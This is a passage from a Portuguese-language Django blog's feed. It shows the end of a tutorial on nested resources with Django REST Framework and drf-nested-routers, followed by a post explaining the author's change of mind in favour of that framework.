&lt;p&gt;O &lt;code&gt;ModelSerializer&lt;/code&gt; "automagicamente" fará o &lt;em&gt;parsing&lt;/em&gt; do relacionamento entre &lt;code&gt;Item&lt;/code&gt; e &lt;code&gt;Channel&lt;/code&gt;. O resultado da serialização de uma instância
de &lt;code&gt;Item&lt;/code&gt; terá uma propriedade &lt;code&gt;channel&lt;/code&gt;, com a chave primária do elemento relacionado como valor:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Item&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;first&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;serializer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ItemSerializer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;serializer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;

&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;channel&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Antes de passarmos para o &lt;em&gt;viewset&lt;/em&gt;, vamos discutir como ficará a &lt;em&gt;URL&lt;/em&gt; desse recurso. Se seguirmos a mesma receita utilizada para &lt;code&gt;Channel&lt;/code&gt;,
teremos um endereço semelhante com o abaixo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://localhost:8000/api/items/&amp;lt;id&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mas que tal se &lt;code&gt;channels&lt;/code&gt; fosse parte da &lt;em&gt;URL&lt;/em&gt; de &lt;code&gt;items&lt;/code&gt;? É possível atingir tal resultado com o conceito de recurso aninhado.&lt;/p&gt;
&lt;h2&gt;Nested resources&lt;/h2&gt;
&lt;p&gt;O que queremos, na prática, é o seguinte:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://localhost:8000/api/channels/&amp;lt;id-do-channel&amp;gt;/items/&amp;lt;id-do-item&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Com isso, ao acessar &lt;code&gt;channels/1/items&lt;/code&gt; (por exemplo), teremos uma listagem de todos os itens relacionados
com o canal &lt;code&gt;1&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Infelizmente o &lt;em&gt;DRF&lt;/em&gt; não possui nenhuma "classe mágica" que faça isso acontecer com poucas linhas de código. Estratégias
para atingir o mesmo resultado podem variar. Existe uma biblioteca que integra-se com o &lt;em&gt;DRF&lt;/em&gt; e produz um resultado
similar ao que queremos. Estou falando da &lt;a href="https://github.com/alanjds/drf-nested-routers" title="Veja o repositório do projeto"&gt;&lt;em&gt;drf-nested-routers&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pipenv install drf-nested-routers
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;Fica o &lt;em&gt;disclaimer&lt;/em&gt;:&lt;/strong&gt; Como o próprio autor da biblioteca salienta na documentação, essa é uma ferramenta em estado experimental, portanto,
cogite alternativas quando estiver fazendo o &lt;em&gt;deploy&lt;/em&gt; do código para produção. Para provar o conceito apresentado nesse &lt;em&gt;post&lt;/em&gt;, ela serve
perfeitamente.&lt;/p&gt;
&lt;p&gt;Agora sim podemos continuar com o desenvolvimento do recurso &lt;code&gt;Item&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# channels/api.py&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;ItemViewSet&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;viewsets&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ModelViewSet&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;serializer_class&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ItemSerializer&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_queryset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;Item&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="n"&gt;channel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;channel_pk&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note a sobrescrita do método &lt;code&gt;get_queryset&lt;/code&gt;. O parâmetro &lt;code&gt;channel_pk&lt;/code&gt; será passado para o &lt;code&gt;ItemViewSet&lt;/code&gt; no momento
em que registrarmos a classe no &lt;code&gt;Router&lt;/code&gt;. Com isso, de forma "lazy", estamos dizendo que os items pesquisados
devem ser relacionados com o &lt;code&gt;channel&lt;/code&gt; mencionado no &lt;em&gt;path&lt;/em&gt; do endereço acessado.&lt;/p&gt;
&lt;p&gt;De volta ao &lt;code&gt;urls.py&lt;/code&gt;, atualizaremos o roteamento para ficar semelhante com o exemplo abaixo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# urls.py&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.urls&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;include&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;rest_framework_nested&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;routers&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;channels.api&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ChannelViewSet&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ItemViewSet&lt;/span&gt;

&lt;span class="n"&gt;api_router&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;routers&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DefaultRouter&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;api_router&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;register&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;r&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;channels&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ChannelViewSet&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;channels_router&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;routers&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NestedDefaultRouter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="n"&gt;api_router&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sa"&gt;r&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;channels&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;lookup&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;channel&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;channels_router&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;register&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;r&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;items&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ItemViewSet&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="n"&gt;basename&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;channel-items&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;urlpatterns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
    &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;api/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;include&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;api_router&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urls&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
    &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;api/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;include&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;channels_router&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urls&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos aos pontos de atenção:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Importamos &lt;code&gt;routers&lt;/code&gt; de &lt;code&gt;rest_framework_nested&lt;/code&gt;, e não mais de &lt;code&gt;rest_framework&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;Agora lidamos com duas instâncias de &lt;code&gt;Router&lt;/code&gt;, a primeiro vindo de &lt;code&gt;api_router = routers.DefaultRouter()&lt;/code&gt;,
  e a segunda vindo de &lt;code&gt;channels_router = routers.NestedDefaultRouter(api_router, r"channels", lookup="channel")&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;DefaultRouter&lt;/code&gt; continua com o mesmo comportamento do exemplo anterior;&lt;/li&gt;
&lt;li&gt;Precisamos adicionar ao &lt;code&gt;urlpatterns&lt;/code&gt; a instância de &lt;code&gt;DefaultRouter&lt;/code&gt; e as instâncias de &lt;code&gt;NestedDefaultRouter&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;NestedDefaultRouter&lt;/code&gt; espera três parâmetros:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;parent_router&lt;/code&gt;: O &lt;code&gt;Router&lt;/code&gt; "pai", podendo ser um &lt;code&gt;DefaultRouter&lt;/code&gt; ou até mesmo outro &lt;code&gt;NestedDefaultRouter&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;parent_prefix&lt;/code&gt;: O prefixo de &lt;em&gt;URL&lt;/em&gt; no qual os recursos registrados passarão a ser articulados como sub recursos;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;lookup&lt;/code&gt;: É a partir dessa informação que a chave &lt;code&gt;channel_pk&lt;/code&gt; é criada e passada para o &lt;em&gt;viewset&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Aqui também, se você não quiser ter a visão de &lt;em&gt;browsable api&lt;/em&gt; habilitada, troque para o &lt;code&gt;SimpleRouter&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Pronto! O recurso &lt;code&gt;Item&lt;/code&gt; está disponível para as operações exibidas anteriormente:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl http://localhost:8000/api/channels/1/items/

&lt;span class="o"&gt;[{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;:1,&lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;Eu me rendo: Django REST Framework&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;Confesso que nunca fui muito simpático ao Django REST Framework...&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;link&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;https://klauslaube.com.br/2020/02/06/eu-me-rendo-django-rest-framework.html&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;pub_date&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;2020-02-06T09:40:00Z&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;channel&amp;quot;&lt;/span&gt;:1&lt;span class="o"&gt;}]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O &lt;em&gt;payload&lt;/em&gt; retorna uma chave &lt;code&gt;channel&lt;/code&gt; para cada item. Uma vez que estamos falando de um &lt;em&gt;nested resource&lt;/em&gt;, não faz muito sentido retornarmos essa informação. A maneira mais prática de corrigirmos isso é alterando a classe serializadora:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# channels/serializers.py&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;ItemSerializer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;serializers&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ModelSerializer&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Meta&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;model&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Item&lt;/span&gt;
        &lt;span class="n"&gt;exclude&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;channel&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como queremos tudo, menos o &lt;code&gt;channel&lt;/code&gt;, utilizamos a propriedade &lt;code&gt;exclude&lt;/code&gt; ao invés de &lt;code&gt;fields&lt;/code&gt;, e determinamos o que queremos excluir da resposta.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Há muito o que ser discutido ainda, como customização, autenticação, segurança, &lt;em&gt;HATEOAS&lt;/em&gt;, etc. Assuntos esses que pretendo abordar em &lt;em&gt;posts&lt;/em&gt; vindouros.&lt;/p&gt;
&lt;p&gt;Com o mínimo coberto no &lt;em&gt;getting started&lt;/em&gt; da documentação do &lt;em&gt;DRF&lt;/em&gt;, já é
possível termos algo &lt;em&gt;up &amp;amp; running&lt;/em&gt;. Provar conceitos e discutir contratos
passou a ser muito menos custoso graças à biblioteca.&lt;/p&gt;
&lt;p&gt;Essa "proximidade" de conceitos como serializadores e &lt;em&gt;viewsets&lt;/em&gt;, com conceitos bem estabelecidos do &lt;em&gt;Django&lt;/em&gt; (como &lt;em&gt;forms&lt;/em&gt; e &lt;em&gt;class-based views&lt;/em&gt;) faz com que o atrito seja menor, e a curva de aprendizagem mais baixa. É quase natural compreender tais artefatos à primeira vista.&lt;/p&gt;
&lt;p&gt;Se o seu projeto é feito em &lt;em&gt;Django&lt;/em&gt;, e você necessita escrever &lt;em&gt;APIs&lt;/em&gt; &lt;em&gt;REST&lt;/em&gt;, não perca tempo e caia de cabeça no &lt;em&gt;REST Framework&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.django-rest-framework.org/tutorial/quickstart/"&gt;Django REST Framework - Quickstart&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/RSS"&gt;Wikipedia - RSS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="apis"></category><category term="python"></category><category term="django"></category><category term="rest"></category><category term="drf"></category></entry><entry><title>Eu me rendo: Django REST Framework</title><link href="https://klauslaube.com.br/2020/02/06/eu-me-rendo-django-rest-framework.html" rel="alternate"></link><published>2020-02-06T09:40:00-03:00</published><updated>2020-02-06T09:40:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2020-02-06:/2020/02/06/eu-me-rendo-django-rest-framework.html</id><summary type="html">&lt;p&gt;Confesso que nunca fui muito simpático ao &lt;a href="https://www.django-rest-framework.org/" title="Visite a página oficial do projeto"&gt;&lt;em&gt;Django REST Framework&lt;/em&gt;&lt;/a&gt;. Antes de adotá-lo tive a oportunidade de explorar outras opções, como o &lt;a href="https://klauslaube.com.br/2017/01/06/construindo-apis-em-django-com-restless.html" title="Leia mais sobre o Restless"&gt;&lt;em&gt;Restless&lt;/em&gt;&lt;/a&gt;, e admito que sempre havia algo faltando, ou algum esforço extra necessário para obter alguma funcionalidade que já vinha embutida no &lt;a href="https://klauslaube.com.br/tag/drf.html" title="Leia mais sobre Django REST Framework"&gt;&lt;em&gt;DRF&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Comecei a aceitar a sua …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Confesso que nunca fui muito simpático ao &lt;a href="https://www.django-rest-framework.org/" title="Visite a página oficial do projeto"&gt;&lt;em&gt;Django REST Framework&lt;/em&gt;&lt;/a&gt;. Antes de adotá-lo tive a oportunidade de explorar outras opções, como o &lt;a href="https://klauslaube.com.br/2017/01/06/construindo-apis-em-django-com-restless.html" title="Leia mais sobre o Restless"&gt;&lt;em&gt;Restless&lt;/em&gt;&lt;/a&gt;, e admito que sempre havia algo faltando, ou algum esforço extra necessário para obter alguma funcionalidade que já vinha embutida no &lt;a href="https://klauslaube.com.br/tag/drf.html" title="Leia mais sobre Django REST Framework"&gt;&lt;em&gt;DRF&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Comecei a aceitar a sua natureza "baterias inclusas" após me distanciar do desenvolvimento &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;. Sob uma ótica diferente, compreendi o papel do &lt;em&gt;DRF&lt;/em&gt;, e fiz as pazes com esse sentimento de confiar em uma biblioteca (supostamente) complexa para construir &lt;a href="https://klauslaube.com.br/tag/apis.html" title="Leia mais sobre APIs"&gt;&lt;em&gt;APIs&lt;/em&gt;&lt;/a&gt; (teoricamente) simples. Afinal, se "ser bloated" for um argumento decisivo, não escolheríamos &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; para escrever &lt;em&gt;APIs&lt;/em&gt; (principalmente em um contexto de microserviços).&lt;/p&gt;
&lt;h2&gt;Motivação&lt;/h2&gt;
&lt;p&gt;É claro que a minha atual simpatia pela ferramenta não se deve apenas ao fato de eu tê-la "aceitado". Pura ignorância da minha parte não ter compreendido antes todos os aspectos positivos que o projeto possui, e todas as facilidades que ele proporciona aos seus usuários.&lt;/p&gt;
&lt;h3&gt;Patrocinado&lt;/h3&gt;
&lt;p&gt;O que faz do &lt;em&gt;REST Framework&lt;/em&gt; um projeto interessante é, para começo de conversa, que ele é financiado colaborativamente, com empresas do calibre de &lt;a href="https://getsentry.com/welcome/" title="Conheça o Sentry"&gt;&lt;em&gt;Sentry&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://www.digitalocean.com/" title="Cloud sem complicação"&gt;&lt;em&gt;DigitalOcean&lt;/em&gt;&lt;/a&gt; fazendo parte da lista de patrocinadores. Essa característica faz com que a biblioteca tenha um &lt;em&gt;long-term&lt;/em&gt; mais provável, uma vez que os esforços de desenvolvimento são financiados. Além disso, &lt;em&gt;releases&lt;/em&gt; são mais substanciais e frequentes.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://fund.django-rest-framework.org/topics/funding/" title="Veja mais em Funding"&gt;Leia mais sobre como patrocinar o projeto&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Autenticação&lt;/h3&gt;
&lt;p&gt;Lidar com autenticação "from scratch" é no mínimo &lt;em&gt;error prone&lt;/em&gt;. O &lt;em&gt;framework&lt;/em&gt; já possui uma série de mecanismos de autenticação &lt;em&gt;built-in&lt;/em&gt; (como &lt;code&gt;BasicAuthentication&lt;/code&gt;, &lt;code&gt;SessionAuthentication&lt;/code&gt; e &lt;code&gt;TokenAuthentication&lt;/code&gt;), e uma infinidade de integrações com &lt;em&gt;third parties&lt;/em&gt; (como &lt;a href="https://github.com/jazzband/django-oauth-toolkit" title="Veja a página do projeto no GitHub"&gt;django-oauth-toolkit&lt;/a&gt;, &lt;a href="https://github.com/davesque/django-rest-framework-simplejwt" title="Biblioteca para adoção de JWT"&gt;django-rest-framework-simplejwt&lt;/a&gt; e &lt;a href="https://github.com/sunscrapers/djoser" title="Excelente opção de auth para APIs em Django"&gt;djoser&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/never-give-up.jpeg" width="590" height="428" title="Não há nada de errado em render-se de vez em quando (publishedtodeath.blogspot.com)" alt="Não há nada de errado em render-se de vez em quando (publishedtodeath.blogspot.com)"&gt;&lt;/p&gt;
&lt;p&gt;A possibilidade de mesclar mecanismos num mesmo recurso permite que você tenha uma &lt;em&gt;API&lt;/em&gt; &lt;em&gt;session based&lt;/em&gt; para o seu &lt;em&gt;front-end&lt;/em&gt; em &lt;em&gt;React&lt;/em&gt; (por exemplo), e o mesmo recurso ser capaz de servir acessos utilizando &lt;em&gt;tokens&lt;/em&gt;, para um possível cliente &lt;em&gt;mobile&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.django-rest-framework.org/api-guide/authentication/" title="Veja mais em Authentication"&gt;Leia mais sobre autenticação&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;SQL &amp;amp; NoSQL&lt;/h3&gt;
&lt;p&gt;Os serializadores são um aspecto muito interessante da biblioteca. Além do trabalho de &lt;em&gt;marshalling&lt;/em&gt;, eles também servem como validadores. Com o &lt;code&gt;ModelSerializer&lt;/code&gt; todos os aspectos do seu modelo são "traduzidos" para a &lt;em&gt;API&lt;/em&gt;, no melhor estilo &lt;em&gt;Django Admin&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Mas existe também a possibilidade de escrita de seu própria classe serializadora ao herdar de &lt;code&gt;serializers.Serializer&lt;/code&gt;. Isso traz flexibilidade para trabalhar com artefatos não relacionados com a &lt;em&gt;ORM&lt;/em&gt; do &lt;em&gt;Django&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;E se &lt;em&gt;HATEOAS&lt;/em&gt; for a sua praia, o &lt;code&gt;HyperlinkedModelSerializer&lt;/code&gt; promove &lt;em&gt;hyperlinks&lt;/em&gt; entre tais classes.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.django-rest-framework.org/api-guide/serializers/" title="Veja mais em Serializers"&gt;Leia mais sobre serialização&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Developer eXperience&lt;/h3&gt;
&lt;p&gt;&lt;em&gt;APIs&lt;/em&gt; escritas com o &lt;em&gt;REST Framework&lt;/em&gt; ainda ganham a funcionalidade de "web browsable API". Com isso é possível navegar pelas definições da sua &lt;em&gt;API&lt;/em&gt; (como &lt;em&gt;endpoints&lt;/em&gt;, formatos e métodos) e interagir com a mesma através de uma interface amigável, pronta para ser compartilhada com outros desenvolvedores interessados em consumir a sua solução.&lt;/p&gt;
&lt;p&gt;Uma outra opção é a geração de &lt;a href="https://klauslaube.com.br/tag/swagger.html" title="Leia mais sobre Swagger"&gt;&lt;em&gt;Swagger&lt;/em&gt;&lt;/a&gt; através do &lt;a href="https://django-rest-swagger.readthedocs.io/en/latest/" title="Leia a documentação do projeto"&gt;&lt;em&gt;Django REST Swagger&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://restframework.herokuapp.com/" title="Visite a aplicação de exemplo da documentação oficial"&gt;Veja a &lt;em&gt;browsable API&lt;/em&gt; em ação&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Praticidade&lt;/h3&gt;
&lt;p&gt;E meu argumento final é em torno de sua praticidade. Ter uma &lt;em&gt;API&lt;/em&gt; &lt;a href="https://klauslaube.com.br/tag/rest.html" title="Leia mais sobre REST"&gt;&lt;em&gt;REST&lt;/em&gt;&lt;/a&gt; em &lt;em&gt;Django&lt;/em&gt;, com o &lt;em&gt;DRF&lt;/em&gt;, leva minutos...&lt;/p&gt;
&lt;p&gt;Algumas customizações poderão exigir um pouco mais de conhecimento da biblioteca, bem como um pouquinho de criatividade, mas nada que te impeça de proporcionar um serviço estável, bem escrito, e em baixíssimo tempo de desenvolvimento.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.django-rest-framework.org/api-guide/generic-views/#customizing-the-generic-views" title="Veja mais em Customizing the generic views"&gt;Leia mais sobre como customizar &lt;em&gt;views&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Talvez seja só devaneio, mas depois de trabalhar com &lt;em&gt;Spring Boot&lt;/em&gt; para construção de &lt;em&gt;APIs&lt;/em&gt; &lt;a href="https://klauslaube.com.br/tag/java.html" title="(não) leia mais sobre Java"&gt;&lt;em&gt;Java&lt;/em&gt;&lt;/a&gt; em um contexto de microserviços, foi que entendi o propósito do &lt;em&gt;REST Framework&lt;/em&gt;. Deixar de lado essa "birra" com ele (supostamente) ser grande serviu para poder enxergar as qualidades da ferramenta.&lt;/p&gt;
&lt;p&gt;Os pontos negativos ainda estão lá, e provavelmente você também vai achá-los quando estiver "entrincheirado" escrevendo a sua solução. Ainda assim, o &lt;em&gt;DRF&lt;/em&gt; deve ser considerado como possível escolha para escrita de suas &lt;em&gt;APIs&lt;/em&gt; em &lt;em&gt;Python&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;No próximo artigo falaremos de uma maneira prática sobre o &lt;em&gt;framework&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até lá.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.django-rest-framework.org/"&gt;Django REST Framework&lt;/a&gt;&lt;/li&gt;
